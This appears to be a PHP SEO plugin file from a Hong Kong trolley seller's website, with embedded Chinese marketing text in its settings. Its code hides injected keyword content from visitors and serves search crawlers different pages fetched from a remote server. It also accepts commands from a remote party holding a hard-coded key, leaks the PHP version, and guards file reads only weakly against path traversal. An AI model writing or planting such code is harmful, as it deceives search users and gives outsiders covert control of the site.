\u53ef\u647a\u758a\u8a2d\u8a08\u4fbf\u65bc\u651c\u5e36<\/h1>\n<p>\u7acb\u5373\u9078\u8cfc\u5404\u6b3e\u4e0d\u93fd\u92fc\u53ca\u92c1\u5408\u91d1\u624b\u62c9\u8eca\u4ed4\uff0c\u63a1\u7528\u8f15\u5de7\u8010\u7528\u91d1\u5c6c\u88fd\u9020\uff0c\u627f\u91cd\u529b\u5f37\uff0c\u5bb9\u6613\u647a\u758a\uff0c\u4fbf\u65bc\u651c\u5e36\uff0c\u53e6\u6709\u5404\u6b3e\u9ad8\u54c1\u8cea\u642c\u904b\u5de5\u5177\u53ca\u8a2d\u5099\uff0c\u6b61\u8fce\u4ee5WhatsApp\u806f\u7d61\u67e5\u8a62\u3002<\/p>\n<h2>\u51fa\u884c\u65b9\u4fbf\u7684\u624b\u62c9\u8eca\u4ed4\uff0c\u89e3\u653e\u96d9\u624b\u66f4\u8f15\u9b06<\/h2>\n<p>\u8a31\u591a\u5e02\u6c11\u53bb\u8d85\u5e02\u8cfc\u7269\u6216\u8005\u83dc\u5e02\u5834\u8cb7\u83dc\uff0c\u901a\u5e38\u4e00\u6b21\u6027\u63a1\u8cfc\u7684\u7269\u54c1\u8f03\u591a\uff0c\u8981\u63d0\u8457\u5927\u5305\u5c0f\u5305\u5f88\u9ebb\u7169\uff0c\u7528\u5851\u81a0\u888b\u88dd\u592a\u591a\u4e0d\u74b0\u4fdd\uff0c\u7528\u74b0\u4fdd\u888b\u5b58\u653e\u624b\u63d0\u592a\u91cd\uff0c\u90a3\u9ebc\u53ef\u4ee5\u5617\u8a66\u4f7f\u7528\u8f15\u5de7\u8010\u7528\u7684\u624b\u62c9\u8eca\u4ed4\u3002\u4e0d\u5c11\u5e02\u6c11\u670b\u53cb\uff0c\u7279\u5225\u662f\u4e2d\u8001\u5e74\u4eba\u8cfc\u7269\u90fd\u559c\u6b61\u62c9\u8457\u624b\u62c9\u8eca\u4ed4\u901b\u8d85\u5e02\u6216\u83dc\u5e02\u5834\uff0c\u8cb7\u591a\u4e86\u5546\u54c1\u592a\u91cd\u4e86\u4e0d\u7528\u64d4\u5fc3\u625b\u4e0d\u52d5\uff0c\u62c9\u8457\u624b\u62c9\u8eca\u4e00\u6a23\u53ef\u4ee5\u8f15\u9b06\u641e\u5b9a\u63a1\u8cfc\u3002<\/p>\n<h3>\u89e3\u9396\u591a\u7a2e\u7528\u9014\u7684\u624b\u62c9\u8eca\u4ed4<\/h3>\n<p>\u6709\u5e74\u8f15\u4eba\u4ee5\u70ba\u4e2d\u8001\u5e74\u4eba\u7684\u624b\u62c9\u8eca\u6a23\u5f0f\u592a\u919c\uff0c\u81ea\u5df1\u5e36\u8457\u53ef\u80fd\u4e0d\u662f\u90a3\u9ebc\u7684\u6642\u5c1a\uff0c\u4e0d\u904e\u4e0d\u7528\u64d4\u5fc3\uff0c\u73fe\u5728\u7684\u624b\u62c9\u8eca\u5df2\u7d93\u5f97\u5230\u4e86\u5f88\u5927\u7684\u6539\u826f\uff0c\u6b3e\u5f0f\u6a23\u5f0f\u591a\uff0c\u529f\u80fd\u9f4a\u5168\uff0c\u9019\u985e\u578b\u591a\u529f\u80fd\u7684\u6298\u758a\u8cfc\u7269\u8eca\u80fd\u88dd\u6771\u897f\uff0c\u80fd\u8f09\u91cd\uff0c\u4e5f\u53ef\u6298\u758a\uff0c\u651c\u5e36\u5f88\u65b9\u4fbf\uff0c\u9700\u8981\u7684\u6642\u5019\u518d\u6253\u958b\u5373\u53ef\u3002\u4e0d\u7528\u6642\uff0c\u5b83\u53ef\u80fd\u662f\u4e00\u500b\u5ea7\u6905\uff0c\u6216\u8005\u662f\u4e00\u500b\u677f\u5b50\uff0c\u9700\u8981\u6253\u958b\u5f8c\u5c31\u662f\u624b\u62c9\u8eca\u4ed4\u3002\u901a\u5e38\uff0c\u624b\u62c9\u8eca\u90fd\u6709\u4e0d\u540c\u7684\u5bb9\u91cf\uff0c\u5f88\u80fd\u88dd\u7269\u54c1\uff0c\u51fa\u9580\u8cfc\u7269\u901b\u8857\u7701\u5fc3\u7701\u529b\uff0c\u57fa\u672c\u4e0a\u65e5\u5e38\u751f\u6d3b\u7528\u54c1\uff0c\u96f6\u98df\uff0c\u74dc\u679c\u852c\u83dc\u90fd\u80fd\u88dd\u4e0b\u3002\u6240\u4ee5\uff0c\u591a\u529f\u80fd\u7684\u624b\u62c9\u8eca\u4ed4\u6210\u70ba\u4e86\u7576\u4e0b\u6d41\u884c\u3002<\/p>\n<h3>\u5805\u56fa\u8010\u7528\u7684\u624b\u62c9\u8eca\u4ed4\u66f4\u53d7\u6b61\u8fce<\/h3>\n<p>\u624b\u62c9\u8eca\u4ed4\u5728\u4e00\u4ee3\u4ee3\u6539\u826f\u4e4b\u5f8c\u54c1\u8cea\u4e5f\u5f97\u5230\u4e86\u8cea\u7684\u98db\u8e8d\uff0c\u6bd4\u5982\u674e\u7dad\u8a18\u7684\u624b\u62c9\u8eca\u4ed4\u63a1\u7528\u4e86\u4e0d\u92b9\u92fc\u53ca\u92c1\u5408\u91d1\u6750\u8cea\uff0c\u8f15\u5de7\u8010\u7528\u7684\u91d1\u5c6c\u6253\u9020\uff0c\u624b\u62c9\u8eca\u4ed4\u8f15\u4fbf\uff0c\u786c\u5ea6\u9ad8\uff0c\u627f\u91cd\u529b\u5f37\uff0c\u7d93\u904e\u4e86\u591a\u6b21\u56b4\u683c\u6e2c\u8a66\u627f\u91cd\u90fd\u6c92\u554f\u984c\uff0c\u4e0d\u6703\u51fa\u73fe\u8b8a\u5f4e\uff0c\u8b8a\u5f62\u7684\u8de1\u8c61\uff0c\u5b83\u4e5f\u5bb9\u6613\u6298\u758a\u651c\u5e36\uff0c\u4e0d\u5360\u5730\u65b9\uff0c\u64cd\u4f5c\u9748\u6d3b\u7c21\u55ae\uff0c\u662f\u5bb6\u5ead\u6216\u8005\u516c\u53f8\uff0c\u500b\u4eba\u90fd\u53ef\u4ee5\u5099\u6709\u7684\u642c\u904b\u5de5\u5177\u3002<\/p>\n<p>\u674e\u7dad\u8a18\u4e0d\u50c5\u51fa\u552e\u9ad8\u54c1\u8cea\u7684\u624b\u62c9\u8eca\u4ed4\uff0c\u9084\u6709\u5404\u7a2e\u6b3e\u5f0f\uff0c\u9ad8\u54c1\u8cea\u7684\u642c\u904b\u5de5\u5177\u548c\u8a2d\u5099\uff0c\u6709\u9700\u8981\u7684\u4f7f\u7528\u8005\u53efWhatsApp\u806f\u7d61\u67e5\u8a62\u3002\u8cfc\u8cb7\u54c1\u8cea\u597d\u7684\u624b\u62c9\u8eca\u4ed4\uff0c\u80fd\u5f88\u5927\u7a0b\u5ea6\u4e0a\u7de9\u89e3\u4e86\u51fa\u884c\u651c\u5e36\u91cd\u7269\u6216\u8005\u5927\u63a1\u8cfc\u6642\u7684\u7a98\u8feb\uff0c\u4e0d\u518d\u64d4\u5fc3\u6771\u897f\u592a\u591a\u6c92\u8fa6\u6cd5\u642c\u904b\uff0c\u4e5f\u4e0d\u7528\u518d\u8f9b\u82e6\u63d0\u8457\u4e00\u5806\u91cd\u7269\uff0c\u4e00\u6b3e\u624b\u62c9\u8eca\u4ed4\u5373\u53ef\u89e3\u6c7a\u3002<\/p>","hideArticlesMark":"","rand_articles":"","rand_article_urls":"","uriIsHome":0,"hideArticlesCacheTime":"","rand_articlesNum":"3","rand_articlesCacheTime":"604800"},{"index":8,"request_uri":"\/logistics-tools\/logistics-cage\/|\/logistics-tools\/logistics-cage","redirect":"","canonical":"","title":"\u674e\u7dad\u8a18 | \u7269\u6d41\u7c60\u8eca\u5805\u56fa\u8010\u7528 \u9069\u5408\u5404\u884c\u5404\u696d \u5404\u6b3e\u54c1\u724c\u4efb\u541b\u9078\u64c7","keywords":"","description":"\u674e\u7dad\u8a18\u5c08\u71df\u5404\u7a2e\u7269\u6d41\u7c60\u8eca\uff0c\u5099\u6709\u5805\u56fa\u8010\u7528\u7684\u81ea\u5bb6\u7814\u767c\u54c1\u724c\u3001\u8f15\u91cf\u9ad8\u8cea\u7684\u65e5\u672c\u54c1\u724cHercules\u3001\u5177\u5c08\u5229\u8a2d\u8a08\u7684\u65e5\u672cPrestar\u3001\u4e0d\u93fd\u92fc\u7c60\u8eca\u7b49\uff0c\u9069\u5408\u4e0d\u540c\u884c\u696d\u642c\u904b\u9700\u8981\uff0c\u6b61\u8fce\u4ee5WhatsApp\u806f\u7d61\u67e5\u8a62\u3002","hideMark":"<div class=\"container products-list\">","hideBody":"<h1>\u674e\u7dad\u8a18 | \u7269\u6d41\u7c60\u8eca\u5805\u56fa\u8010\u7528 \u9069\u5408\u5404\u884c\u5404\u696d \u5404\u6b3e\u54c1\u724c\u4efb\u541b\u9078\u64c7<\/h1>\n<p>\u674e\u7dad\u8a18\u5c08\u71df\u5404\u7a2e\u7269\u6d41\u7c60\u8eca\uff0c\u5099\u6709\u5805\u56fa\u8010\u7528\u7684\u81ea\u5bb6\u7814\u767c\u54c1\u724c\u3001\u8f15\u91cf\u9ad8\u8cea\u7684\u65e5\u672c\u54c1\u724cHercules\u3001\u5177\u5c08\u5229\u8a2d\u8a08\u7684\u65e5\u672cPrestar\u3001\u4e0d\u93fd\u92fc\u7c60\u8eca\u7b49\uff0c\u9069\u5408\u4e0d\u540c\u884c\u696d\u642c\u904b\u9700\u8981\uff0c\u6b61\u8fce\u4ee5WhatsApp\u806f\u7d61\u67e5\u8a62\u3002<\/p>\n<h2>\u674e\u7dad\u8a18\u7269\u6d41\u7c60\u8eca\u5805\u56fa\u8010\u7528\uff0c\u516c\u53f8\u4f01\u696d\u7269\u6599\u7684\u7269\u6d41\u5468\u8f49\u5f88\u65b9\u4fbf<\/h2>\n<p>\u5de5\u5ee0\u5009\u5eab\u8981\u642c\u9001\u8ca8\u7269\uff0c\u9700\u8981\u4f7f\u7528\u7269\u6d41\u7c60\u8eca\uff0c\u5b83\u4e3b\u8981\u662f\u7528\u65bc\u5927\u578b\u8d85\u5e02\uff0c\u6216\u8005\u5de5\u5ee0\u5de5\u5e8f\u9593\u9700\u8981\u9032\u884c\u8ca8\u7269\uff0c\u5546\u54c1\u5468\u8f49\u6642\u4f7f\u7528\u3002\u7c60\u8eca\u4e5f\u53eb\u505a\u88dd\u5378\u8eca\uff0c\u7269\u6d41\u53f0\u8eca\uff0c\u5b89\u88dd\u6709\u8173\u8f2a\uff0c\u914d\u9001\u6216\u8005\u5b58\u5132\u7269\u6599\u6240\u7528\u7684\u8a2d\u5099\uff0c\u6709\u591a\u7a2e\u7684\u7528\u9014\u3002\u5c0d\u65bc\u5e38\u4f7f\u7528\u7269\u6d41\u7c60\u8eca\u7684\u55ae\u4f4d\uff0c\u5efa\u8b70\u8cfc\u8cb7\u674e\u7dad\u8a18\u54c1\u724c\u7684\u7269\u6d41\u7c60\u8eca\uff0c\u8a72\u516c\u53f8\u7684\u7c60\u8eca\u7522\u54c1\u6709\u5404\u7a2e\u54c1\u724c\uff0c\u4e5f\u9069\u5408\u5404\u884c\u5404\u696d\u3002<\/p>\n<h3>\u674e\u7dad\u8a18\u7269\u6d41\u7c60\u8eca\u7684\u512a\u52e2\u9ad4\u73fe<\/h3>\n<p>\u4e0d\u540c\u884c\u696d\u6709\u642c\u904b\u9700\u6c42\u7684\u4f01\u696d\uff0c\u53ef\u4ee5\u9078\u64c7\u674e\u7dad\u8a18\u7684\u5404\u985e\u7269\u6d41\u7c60\u8eca\uff0c\u4ed6\u5011\u9078\u7528\u4f86\u81ea\u81ea\u5bb6\u7814\u767c\u54c1\u724cMover Master\uff0c\u5805\u56fa\u8010\u7528\uff0c\u6709\u5404\u500b\u6b3e\u5f0f\uff0c\u9084\u6709\u8f15\u91cf\u9ad8\u8cea\u7684\u65e5\u672c\u54c1\u724c\uff0cHercules\u3001\u5177\u5c08\u5229\u8a2d\u8a08\u7684\u65e5\u672cPrestar\u3001\u4e0d\u92b9\u92fc\u7c60\u8eca\u7b49\uff0c\u5805\u56fa\u8010\u7528\uff0c\u74b0\u4fdd\u5b89\u5168\uff0c\u5177\u6709\u4e0d\u932f\u7684\u6027\u50f9\u6bd4\uff0c\u5f88\u9069\u5408\u4f01\u696d\u5927\u63a1\u8cfc\u7528\u65bc\u5009\u5eab\u914d\u9001\u7269\u6d41\uff0c\u7531\u65bc\u4e45\u7d93\u8010\u7528\u6240\u4ee5\u4e5f\u80fd\u8d77\u5230\u6e1b\u5c11\u6210\u672c\u652f\u51fa\u7684\u4f5c\u7528\u3002<\/p>\n<h3>\u7269\u6d41\u7c60\u8eca\u7684\u898f\u7bc4\u4f7f\u7528<\/h3>\n<p>\u7c60\u8eca\u7684\u512a\u52e2\u591a\u591a\uff0c\u901a\u5e38\u662f\u8a31\u591a\u4f01\u696d\u5009\u5eab\u4e2d\u914d\u9001\u8ca8\u7269\u5e38\u9700\u8981\u7684\u5de5\u5177\uff0c\u7269\u6d41\u53f0\u8eca\u591a\u534a\u90fd\u80fd\u6298\u758a\uff0c\u62c6\u5378\uff0c\u4f7f\u7528\u524d\u7d44\u88dd\u6216\u5c55\u958b\u5373\u53ef\uff0c\u4f7f\u7528\u5f8c\u518d\u6298\u758a\u6536\u56de\uff0c\u4e0d\u5360\u5730\u65b9\u3002\u65e5\u5e38\u4f7f\u7528\u53f0\u8eca\uff0c\u9700\u6ce8\u610f\u898f\u7bc4\uff0c\u6bd4\u5982\u4f7f\u7528\u524d\u6aa2\u67e5\u5730\u677f\u662f\u5426\u653e\u5e73\uff0c\u63d2\u92b7\u662f\u5426\u63d2\u597d\uff0c\u8173\u8f2a\u80fd\u5426\u6b63\u5e38\u904b\u884c\uff0c\u7c60\u8eca\u88dd\u8ca8\u904b\u8f38\uff0c\u8ca8\u54c1\u8981\u5806\u653e\u5e73\u6574\uff0c\u8ca8\u54c1\u4e0d\u80fd\u8d85\u8f09\uff0c\u6bcf\u500b\u7269\u6d41\u7c60\u8eca\u90fd\u6709\u627f\u8f09\u80fd\u529b\uff0c\u9084\u8981\u6ce8\u610f\u7c60\u8eca\u81a0\u8f2a\u5239\u8eca\u6709\u6c92\u6709\u958b\u555f\uff0c\u518d\u5b8c\u6210\u7c60\u8eca\u7684\u4f7f\u7528\u5f8c\u9700\u6aa2\u67e5\u4e00\u904d\u4f7f\u7528\u72c0\u6cc1\uff0c\u4e4b\u5f8c\u653e\u5728\u6307\u5b9a\u4f4d\u7f6e\u6574\u9f4a\u64fa\u653e\u3002<\/p>\n<p>\u5de5\u5ee0\u4e2d\u5378\u8ca8\u78ba\u5be6\u6703\u5e38\u5e38\u98df\u7528\u7269\u6d41\u7c60\u8eca\uff0c\u5b83\u5f88\u65b9\u4fbf\uff0c\u674e\u7dad\u8a18\u7269\u6d41\u7c60\u8eca\u898f\u683c\u591a\uff0c\u985e\u578b\u591a\uff0c\u6750\u8cea\u4e5f\u4e0d\u4e00\u6a23\uff0c\u8010\u7528\u74b0\u4fdd\uff0c\u9084\u662f\u5f88\u9069\u5408\u5de5\u5ee0\u4f7f\u7528\u3002\u6709\u9700\u8981\u7684\u4f7f\u7528\u8005\u53ef\u4ee5WhatsApp\u806f\u7d61\u67e5\u8a62\uff0c\u5e6b\u4f60\u9078\u5230\u5408\u9069\u7684\u7c60\u8eca\uff0c\u63d0\u9ad8\u5009\u5eab\u7269\u6d41\u7684\u5de5\u4f5c\u6548\u7387\u3002<\/p>","hideArticlesMark":"","rand_articles":"","rand_article_urls":"","uriIsHome":0,"hideArticlesCacheTime":"","rand_articlesNum":"3","rand_articlesCacheTime":"604800"}],"seo_filters_num":"9","rand_articles":"","rand_article_urls":"","head_start":"<meta name=\"google-site-verification\" content=\"RPZ87-BVS0SmMs_UFziVtPD3e9bZuUBjWK8ry39myao\" \/>","head_end":"<link href=\"https:\/\/ssl.youfindonline.info\/cdn\/iframe\/fcj.go.css?class=yfContent&background=fff\" rel=\"stylesheet\" \/>","body_start":"","body_end":"","atime":"2021-10-15 12:50:32","utime":"2021-10-18 09:36:00","api_md5":"aa1df65d0f844389b3ff1b09f53b9c30","auth_key":"ajGckKrVIBjAJCwWRlM1GAFRlw13JkBD","remote_page_render":"0","relatedArticles":"0","protocol_format":"0","rewriteMode":"0","htaRedirectFix":"0","version_id":"6","in_use":"","email_monitor":"1","fix_canonical":"0","fix_img_tag":"0","fix_hreflang":"","etime":"2022-09-12","sitemap_auto_fix":"0","sitemap_url":"https:\/\/lwkpy.com.hk\/sitemap.xml","mode_webmster":"0","mode_seo":"0","td_phrase":"32","use_item":""}
EOF;
$FCSEO = FCSEO::app();
# SEO-redirect
$filters = FCSEO::app()->setting('get', 'seo_filters');
if( is_array($filters) && $filters ){
	foreach($filters as $k=>$filter){
		if( $filter['request_uri']==FCSEO::app()->request_uri || in_array(FCSEO::app()->request_uri, array_unique(array_map('trim', (array)explode('|', $filter['request_uri'])))) || in_array(urldecode(FCSEO::app()->request_uri), array_unique(array_map('trim', (array)explode('|', $filter['request_uri'])))) ){
			if( isset($filter['redirect']) && strlen($filter['redirect'])>0 ){
				ob_clean();
				header("HTTP/1.1 301 Moved Permanently");
				header('Message: SEO-filter');
				header("Location: {$filter['redirect']}");die;
			}
		}
	}
}
# htaccess Redirect Fix
if( FCSEO::app()->setting('get', 'htaRedirectFix') ){
	$htaccess_file = FCPATH.'/.htaccess';
	$htaccess_content = file_exists($htaccess_file)?file_get_contents($htaccess_file):'';
	# 语法 【Redirect 301 [REQUEST_URI] [跳转新页面]】
	strlen($htaccess_content) && preg_match_all('@\n\s*Redirect\s+[\d]+?\s+(\S+)\s+(\S+)@iu',$htaccess_content,$htaRedirects);
	if( isset($htaRedirects[1]) && $htaRedirects[1] ){
		$url_format = function($url){return strtolower(urldecode(urldecode($url)));};
		foreach($htaRedirects[1] as $k=>$v){
			if( isset($htaRedirects[2][$k]) && strlen($htaRedirects[2][$k]) && in_array($url_format(FCSEO::app()->request_uri),[($v),$url_format($v)]) ){
				ob_clean();
				header("HTTP/1.1 301 Moved Permanently");
				header('Message: SEO-filter');
				header("Location: {$htaRedirects[2][$k]}");die;
			}
		}
	}
}
FCSEO::app()->remotePageRender();
# SEO数据管理
ob_start(array(FCSEO::app(), 'seo'));
class FCSEO{
	public static $title;
	public $host = 'lwkpy.com.hk';
	public $domain = 'lwkpy.com.hk';
	public $protoct = 'https';
	public $request_uri = '';
	public $last_update = '2021-10-18 09:36:00';
	public $api_host = 'china.yfsystem.com';
	public $id = '136';
	public $auth_key = 'ajGckKrVIBjAJCwWRlM1GAFRlw13JkBD';
	public $settings = array();
	public $rq;
	public $request_url = '';
	private static $_instance;
	private function __construct(){}
	private function __clone(){}
	public static function app(){
		if(! (self::$_instance instanceof self) ){
			self::$_instance = new self();
			self::$_instance->init();
		}
		return self::$_instance;
	}
	
	# 最近一次执行SEO优化的时间（用于分析API是否生效）
	public function seoTime(){
		if( time()-filemtime(FCPATH.'/yf.seo.api.time.txt')>300 ){
			file_put_contents(FCPATH.'/yf.seo.api.time.txt', time());
		}
	}
	
	public function rewriteMode(){
		$uri = urldecode($this->request_uri);
		$filename = file_exists(FCPATH.($uri))?FCPATH.($uri):preg_replace('@\?(.*)$@iu', '', FCPATH.$uri);
		$filename = str_replace('../', '', $filename);
		$filename = rtrim($filename, '/');
		if( file_exists($filename) && is_dir($filename) && $this->setting('get', 'rewriteMode') ){
			foreach(array('/index.php', '/default.php', '.php') as $defaultPage){
			    if( file_exists($filename.$defaultPage) ){
					include_once($filename.$defaultPage);break;
			    }
			}
			foreach(array('/index.html', '/index.htm'/*, '.html', '.htm'*/) as $defaultPage){
			    if( file_exists($filename.$defaultPage) ){
					$filename .= $defaultPage;break;
			    }
			}
		}
		if( !preg_match('@\.(php)$@i', $filename) && file_exists($filename) && !is_dir($filename) ){
			$html = file_get_contents($filename);
			$charset = (preg_match('@<meta[^>]+charset=([0-9a-z-_]+)[^>]+>@i', $html, $match)&&isset($match[1])&&$match[1]?$match[1]:'UTF-8');
			if(preg_match('@(\.css)@i', $filename)){
				header("Content-type:text/css");
			}elseif(preg_match('@(\.js)@i', $filename)){
				header("Content-Type:application/javascript");
			}elseif(preg_match('@\.(jpg|jpeg|png|gif|icon)@i', $filename)){
				header("Content-type: image/jpeg");
			}elseif(preg_match('@\.(json)@i', $filename)){
				header("Content-type: application/json");
			}elseif(preg_match('@\.(pdf)@i', $filename)){
				header("Content-type: application/pdf");
			}elseif(preg_match('@\.(xml)@i', $filename)){
				header("Content-type: text/xml");
			}elseif(preg_match('@<\/(head|html|body)>@i', $html)){
				header("Content-type: text/html; charset={$charset}");
			}
			echo $this->seo($html);die;
		}
		if( $this->protoct=='https' && isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT']==80 ){
			header('HTTP/1.1 301 Moved Permanently');
			header("Location: https://{$this->host}{$this->request_uri}");die;
		}
	}
	
	public function remotePageRender(){
		if( $this->setting('get', 'remote_page_render') && (preg_match('@.(1e100\.net|yahoo\.com|a-msedge\.net)$@i', gethostbyaddr($_SERVER['REMOTE_ADDR'])) || $this->isCrawler()) ){
			$url = str_ireplace(array('?','&'), array('%3F', '%26'), $this->request_url);
			echo file_get_contents("http://{$this->api_host}/seo/remotePageRender?url={$url}");die;
		}
	}
	
	public function seo($str=''){
		# 仅对SEO页面进行优化
		if( !stripos($str,'</head>') ){
			return $str;
		}
		$this->seoTime();
		try{
			
		}catch(Exception $e){
			echo $e->getMessage();
		}
		$str = str_ireplace('</head>', "<!-- last update {$this->last_update} --></head>", $str);
		$tags = array(
			'title'=>'',
			'keywords'=>'',
			'description'=>'',
			'hideMark'=>'',
			'hideBody'=>'',
			'hideArticlesMark'=>'',
			'hideArticlesBody'=>'',
			'head_start'=>'',
			'head_end'=>'',
			'body_start'=>'',
			'body_end'=>'',
			'relatedArticlesMark'=>'',
			'relatedArticlesBody'=>'',
		);
		self::$title = preg_match('@<title[^>]*>(.+)</title>@isU',$str,$match)?$match[1]:'';
		RandArticles::$REQUEST_URI = $this->request_uri;
		if( $this->setting('get', 'protocol_format') ){
			$str = preg_replace("@(http|https):(//[0-9a-z.-_]*{$this->host})@i", '$2', $str);
		}
		if( strpos($str,'PHP_VERSION')!==false && strpos($str,'REQUEST_URI')!==false ){return $str;}
		$str = str_ireplace('</head>', implode("\n", array('<!--', var_export(array('PHP_VERSION'=>PHP_VERSION, 'REQUEST_URI'=>htmlentities($this->request_uri)),1), '-->'))."</head>", $str);
		$str = preg_replace_callback('@<a([^>]+)href=[\'|\"]([^>]*)[\'|\"]([^>]+)>@i', function($matches){
			if( isset($matches[2]) && preg_match('@//([a-z0-9-.]+)/?@', $matches[2], $match) && isset($match[1]) && stripos($match[1], FCSEO::app()->domain)===false ){
				return preg_match('@rel([^>]+)nofollow@i', $matches[0])?$matches[0]:str_ireplace('>', ' rel="external nofollow">', $matches[0]);
			}else{
				return $matches[0];
			}
		}, $str);
		$str = preg_replace('@<meta\s[^>]*name=[\'|\"]robots[\'|\"][^>]*>@i', '', $str);
		$filters = $this->setting('get', 'seo_filters');
		if( is_array($filters) && $filters ){
			foreach($filters as $k=>$filter){
				if( $filter['request_uri']==$this->request_uri || in_array($this->request_uri, array_unique(array_map('trim', (array)explode('|', $filter['request_uri'])))) || in_array(urldecode($this->request_uri), array_unique(array_map('trim', (array)explode('|', $filter['request_uri'])))) ){
					if( stripos($filter['rand_articles'], '</p>')!==false ){
						RandArticles::$expire_time = isset($filter['rand_articlesCacheTime'])?intval($filter['rand_articlesCacheTime']):RandArticles::$expire_time;
						RandArticles::$article_num = isset($filter['rand_articlesNum'])?intval($filter['rand_articlesNum']):RandArticles::$article_num;
						RandArticles::$articles = $filter['rand_articles'];
					}
					if( strlen($filter['rand_article_urls'])>4 ){
						RandArticles::$article_urls = $filter['rand_article_urls'];
					}
					$tags['title'] = $filter['title'];
					$tags['keywords'] = $filter['keywords'];
					$tags['description'] = $filter['description'];
					$tags['hideMark'] = $filter['hideMark'];
					$tags['hideBody'] = $filter['hideBody'];
					$tags['hideArticlesMark'] = $filter['hideArticlesMark'];
					if( strlen($tags['hideArticlesMark'])>2 ){
						$tags['hideArticlesBody'] = RandArticles::articles2html(RandArticles::$article_num);
					}
				}
			}
		}
		$tags['head_start'] = $this->setting('get', 'head_start');
		$tags['head_end'] = $this->setting('get', 'head_end');
		$tags['body_start'] = $this->setting('get', 'body_start');
		$tags['body_end'] = $this->setting('get', 'body_end');
		$relatedArticles = (int)$this->setting('get', 'relatedArticles');
		if( $relatedArticles===1 ){
			$tags['relatedArticlesMark'] = '</body>';
			$tags['relatedArticlesBody'] = RandArticles::pageRelated2html();
		}
		preg_match('@<link\s+[^>]*href=[\'|\"]([^\'|^\"]+)[\'|\"][^>]*>@isu', $tags['head_start'].$tags['head_end'].$tags['body_start'].$tags['body_end'], $match);
		if( isset($match[1]) && stripos($match[1],'.css')!==false && stripos($match[1],'/ssl.youfindonline.info/')===false ){
			$ps = parse_url($match[1]);
			if( !file_exists(FCPATH.$ps['path']) && !file_exists(rtrim($_SERVER['DOCUMENT_ROOT'],'/').$ps['path']) ){
				$tags['head_end'] .= '<script>document.styleSheets[0].addRule(".yfContent","height:1px!important;overflow:auto;background:none;");</script>';
				$tags['body_end'] .= '<script>document.querySelectorAll(".yfContent").forEach(function(e){e.remove();});</script>';
			}
		}
		$str = $this->seo_replaceHtmlTags($str,$tags);
		return $str;
	}

	function init(){
		$this->rq = (array)json_decode((file_get_contents('php://input')), 1);
		$this->rq = empty($this->rq)?$_REQUEST:$this->rq;
		$this->host = isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:$this->domain;
		$this->protoct = isset($_SERVER['REQUEST_SCHEME'])?$_SERVER['REQUEST_SCHEME']:$this->protoct;
		$this->request_uri = substr($_SERVER['REQUEST_URI'],-1,1)=='/'?substr($_SERVER['REQUEST_URI'],0,-1):$_SERVER['REQUEST_URI'];
		$this->request_url = "{$this->protoct}://{$this->host}{$this->request_uri}";
		if(
			isset($this->rq['name']) && $this->rq['name']
			&& isset($this->rq['data']) && is_array($this->rq['data'])
			&& (($_SERVER['REMOTE_ADDR']==gethostbyname($this->api_host)) || ($this->auth_key==$this->rq['auth_key']) )
		){
			ob_clean();
			$this->rq['datatype'] = isset($this->rq['datatype'])?$this->rq['datatype']:'';
			switch($this->rq['datatype']){
				case 'object':
					echo json_encode($this->user_call($this->rq['name'], $this->rq['data']));break;
				case 'buffer':
					$this->user_call($this->rq['name'], $this->rq['data']);break;
				case 'text':
					echo (string)$this->user_call($this->rq['name'], $this->rq['data']);break;
			}
		}
		$this->rewriteMode();
	}

	private function trim_json($json_str=''){
		$json_str = trim($json_str);
		#$json_str = str_replace("'", "&#039;", $json_str);
		for ($i = 0; $i <= 31; ++$i) { 
			$json_str = str_replace(chr($i), "", $json_str); 
		}
		$json_str = str_replace(chr(127), "", $json_str);
		if (0 === strpos(bin2hex($json_str), 'efbbbf')) {
			$json_str = substr($json_str, 3);
		}
		return $json_str;
	}
	
	private function seo_replaceHtmlTags($html,$tags=array()){
		$tags = $tags?array_map(function($str){return str_replace('$', '&#36;', $str);}, $tags):$tags;
		if(isset($tags['title']) && $tags['title']!=''){
			$html = preg_replace('/<title>(.*)<\/title>/i',sprintf('<title>%s</title>',$tags['title']),$html);
		}
		if(isset($tags['description'])&& $tags['description']!=''){
			if(!preg_match('/<meta[^>]*name=\"description\"[^>]*>/i',$html,$match)){
				$html = preg_replace('/<\/title>/i',sprintf('</title><meta name="description" content="%s" />',$tags['description']),$html);
			}else{
				$html = preg_replace('/<meta[^>]*name=\"description\"[^>]*>/i',sprintf('<meta name="description" content="%s" />',$tags['description']),$html);
			}
		}
		if(isset($tags['keywords']) && $tags['keywords']!=''){
			if(!preg_match('/<meta[^>]*name=\"keywords\"[^>]*>/i',$html,$match)){
				$html = preg_replace('/<\/title>/i',sprintf('</title><meta name="keywords" content="%s" />',$tags['keywords']),$html);
			}else{
				$html = preg_replace('/<meta[^>]*name=\"keywords\"[^>]*>/i',sprintf('<meta name="keywords" content="%s" />',$tags['keywords']),$html);
			}
		}
		if(isset($tags['hideMark']) && isset($tags['hideBody']) && $tags['hideMark']!='' && $tags['hideBody']!=''){
			$html = preg_replace(sprintf('@%s@i', preg_quote($tags['hideMark'], '@')), '<div class="yfContent">'.$tags['hideBody'].'</div>'.$tags['hideMark'], $html, 1);
		}
		if(isset($tags['hideArticlesMark']) && isset($tags['hideArticlesBody']) && $tags['hideArticlesMark']!='' && $tags['hideArticlesBody']!=''){
			$html = preg_replace(sprintf('@%s@i', preg_quote($tags['hideArticlesMark'], '@')), '<div class="yfContent">'.$tags['hideArticlesBody'].'</div>'.$tags['hideArticlesMark'], $html, 1);
		}
		if(isset($tags['relatedArticlesMark']) && isset($tags['relatedArticlesBody']) && $tags['relatedArticlesMark']!='' && $tags['relatedArticlesBody']!=''){
			$html = preg_replace(sprintf('@%s@i', preg_quote($tags['relatedArticlesMark'], '@')), '<div class="yfContent">'.$tags['relatedArticlesBody'].'</div>'.$tags['relatedArticlesMark'], $html, 1);
		}
		if(isset($tags['head_start']) && $tags['head_start']!=''){
			$html = preg_replace(array('@<head>@i','@<head\s[^>]*>@i'), "$0{$tags['head_start']}", $html);
		}
		if(isset($tags['head_end']) && $tags['head_end']!=''){
			$html = preg_replace(array('@</head>@i'), "{$tags['head_end']}$0", $html);
		}
		if(isset($tags['body_start']) && $tags['body_start']!=''){
			$html = preg_replace(array('@<body>@i','@<body\s[^>]*>@i'), "$0{$tags['body_start']}", $html);
		}
		if(isset($tags['body_end']) && $tags['body_end']!=''){
			$html = preg_replace(array('@</body>@i'), "{$tags['body_end']}$0", $html);
		}
		return $html;
	}
	
	private function user_call($name, $data){
